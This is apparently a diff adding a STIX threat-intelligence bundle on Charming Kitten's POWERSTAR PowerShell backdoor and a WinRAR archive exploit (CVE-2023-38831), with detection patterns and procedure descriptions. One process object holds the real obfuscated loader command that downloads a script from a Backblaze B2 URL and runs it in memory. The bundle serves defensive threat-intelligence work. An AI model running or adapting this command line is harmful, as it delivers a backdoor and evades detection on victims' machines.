@@ -1,0 +1,236 @@
+{
+  "type": "bundle",
+  "id": "bundle--2d6f1a84-9b3c-4e57-8a10-5c7e3f9b1d62",
+  "objects": [
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "identity",
+      "id": "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94",
+      "name": "Volexity",
+      "identity_class": "organization",
+      "description": "Threat intelligence and incident response vendor that published the POWERSTAR analysis."
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "intrusion-set",
+      "id": "intrusion-set--437c87ae-cd8d-4b3f-b3e8-82babaa3a17d",
+      "name": "Charming Kitten",
+      "aliases": [
+        "APT42"
+      ],
+      "description": "Iran-aligned intrusion set. Public name, as reported in vendor research."
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "malware",
+      "id": "malware--a6049fc1-9d98-433c-86be-7a7368902ca3",
+      "name": "POWERSTAR",
+      "is_family": true,
+      "malware_types": [
+        "backdoor"
+      ],
+      "description": "PowerShell backdoor attributed to Charming Kitten."
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "indicator",
+      "id": "indicator--8df338e4-7dc4-40ba-b081-74757c2d6c3d",
+      "name": "POWERSTAR in-memory loader command line",
+      "pattern": "[process:command_line LIKE '%gcm i*x%' AND process:command_line LIKE '%backblazeb2.com%']",
+      "pattern_type": "stix",
+      "valid_from": "2026-07-28T14:14:00.000Z",
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_opencti_main_observable_type": "Process"
+    },
+    {
+      "type": "x-procedure",
+      "spec_version": "2.1",
+      "id": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "created_by_ref": "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94",
+      "name": "Load POWERSTAR backdoor in memory via remote-hosted decryption stage",
+      "description": "Keep the POWERSTAR backdoor off disk and give the operator a remote kill switch over it. A malicious LNK runs cmd.exe to build an obfuscated PowerShell command that downloads a first-stage script from Backblaze B2 and runs it in memory through the Invoke-Expression alias 'gcm i*x'. A second remote script supplies the AES decryption routine and key; only then is the encrypted backdoor decrypted and run, and if that script is withdrawn the payload cannot be recovered. A defender sees cmd.exe spawning PowerShell with a wildcard Get-Command lookup and outbound HTTPS to backblazeb2.com.",
+      "x_procedure_type": "reporting",
+      "platforms": [
+        "Windows"
+      ],
+      "tactics": [
+        "execution",
+        "defense-evasion"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--e94e1030-0b72-4b37-ab03-00e1a81a665e",
+        "attack-pattern--4c209832-0086-42bf-b4ac-84cdc2434a72",
+        "attack-pattern--ed0f9d93-0ae4-4feb-bec9-7f02016a6189"
+      ],
+      "x_observable_refs": [
+        "process--24208e46-d950-42ff-a9c3-53b24b5b5dc8"
+      ],
+      "x_source_refs": [
+        "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94"
+      ],
+      "x_fingerprint": "96aafec6513edec8ae3e83781c0575f7",
+      "confidence": 85,
+      "external_references": [
+        {
+          "source_name": "Volexity",
+          "description": "Charming Kitten Updates POWERSTAR with an InterPlanetary Twist",
+          "url": "https://www.volexity.com/blog/2023/06/28/charming-kitten-updates-powerstar-with-an-interplanetary-twist/"
+        }
+      ],
+      "extensions": {
+        "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": {
+          "extension_type": "new-sdo"
+        }
+      }
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--24208e46-d950-42ff-a9c3-53b24b5b5dc8",
+      "command_line": "cmd.exe /c set c=powershecde43ell.ecde43exe -wcde43e 1 \"$p=(wgcde43eet -Ucde43eri https://bluebox10546.s3.us-west-004.backblazeb2.com/sa/88W3X81EN/cettj34c.txt -UseBasicde43ecParsing).Contcde43eent; &(gcm i*x)$p\"; & call %c:cde43e=%"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--cdf16bab-23e6-4055-a00e-8d480b4e2768",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "implements-technique",
+      "source_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "target_ref": "attack-pattern--e94e1030-0b72-4b37-ab03-00e1a81a665e"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--427308b2-edc3-49a8-a32e-c4381742ff44",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "implements-technique",
+      "source_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "target_ref": "attack-pattern--4c209832-0086-42bf-b4ac-84cdc2434a72"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--a77372a8-4864-4051-9b70-04c59eff7d89",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "implements-technique",
+      "source_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "target_ref": "attack-pattern--ed0f9d93-0ae4-4feb-bec9-7f02016a6189"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--8bf10eaf-4f88-4728-acfe-7cffb049d26a",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "target_ref": "malware--a6049fc1-9d98-433c-86be-7a7368902ca3"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--b0dd1c71-b64b-435b-b69c-b40d3e9b50d1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--437c87ae-cd8d-4b3f-b3e8-82babaa3a17d",
+      "target_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d",
+      "start_time": "2023-05-01T00:00:00.000Z",
+      "description": "May 2023 spear-phishing campaign against a commentator on Iran; password-protected RAR delivered after multi-day rapport building."
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--e7ad6522-90e7-4d46-a00d-99b3638749f5",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--8df338e4-7dc4-40ba-b081-74757c2d6c3d",
+      "target_ref": "x-procedure--5e0040b0-42df-46d2-8e7f-0fa3d753b75d"
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "vulnerability",
+      "id": "vulnerability--b7e3a1c4-5d29-4f60-8a1e-2c9d4f7b6e03",
+      "name": "CVE-2023-38831",
+      "description": "WinRAR flaw that lets a crafted ZIP archive run a file other than the one the user opens.",
+      "external_references": [
+        {
+          "source_name": "cve",
+          "external_id": "CVE-2023-38831"
+        }
+      ]
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "file",
+      "id": "file--c2a8f4d1-6e37-4b90-9d15-8f3a1b7c5e24",
+      "name": "invoice.pdf .cmd"
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "report",
+      "id": "report--e5b9d3a7-1c48-4a2f-b6d0-7a3e9c1f8b52",
+      "name": "Example report on archive-based initial access",
+      "published": "2026-07-28T14:14:00.000Z",
+      "report_types": [
+        "threat-report"
+      ],
+      "description": "Generic placeholder report used to show a procedure source in the library.",
+      "object_refs": [
+        "vulnerability--b7e3a1c4-5d29-4f60-8a1e-2c9d4f7b6e03"
+      ]
+    },
+    {
+      "spec_version": "2.1",
+      "created": "2026-07-28T14:14:00.000Z",
+      "modified": "2026-07-28T14:14:00.000Z",
+      "type": "x-opencti-procedure",
+      "id": "x-opencti-procedure--7c4d2e91-3b5a-4f18-9a62-d0e1b3a5c847",
+      "name": "Execute payload via crafted ZIP archive in WinRAR",
+      "description": "Get code execution from a single user action. The archive holds a decoy document and a folder with the same name; when the user opens the decoy, the vulnerable WinRAR version runs a script stored in the folder. A defender sees WinRAR as the parent of cmd.exe or a script host right after an archive is opened.",
+      "x_procedure_type": "reporting",
+      "platforms": [
+        "Windows"
+      ],
+      "tactics": [
+        "execution"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63"
+      ],
+      "x_vulnerability_refs": [
+        "vulnerability--b7e3a1c4-5d29-4f60-8a1e-2c9d4f7b6e03"
+      ],
+      "x_observable_refs": [
+        "file--c2a8f4d1-6e37-4b90-9d15-8f3a1b7c5e24"
+      ],
+      "x_source_refs": [
+        "report--e5b9d3a7-1c48-4a2f-b6d0-7a3e9c1f8b52"
+      ],
+      "confidence": 75,
+      "created_by_ref": "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94"
+    }
+  ]
+}
